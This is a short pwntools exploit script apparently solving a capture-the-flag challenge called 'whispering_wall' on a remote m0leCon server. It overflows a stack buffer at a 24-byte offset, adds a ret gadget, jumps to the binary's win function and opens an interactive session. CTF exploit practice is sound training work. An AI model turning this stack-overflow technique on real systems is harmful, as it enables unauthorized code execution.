#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./whispering_wall', checksec=False)

# rip offset found with #python3 -c "from pwn import *; print(cyclic(200)) as input + debugging
# or try rip offset = buf (16B) + saved RPB (8B)
OFFSET_TO_RIP = 24

ret_gadget = 0x000000000040101a
p = remote("offsec.m0lecon.it", 13513)
p.recvuntil(b"whisper:")

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    p64(elf.sym.win),
    )
p.send(payload)
p.interactive()
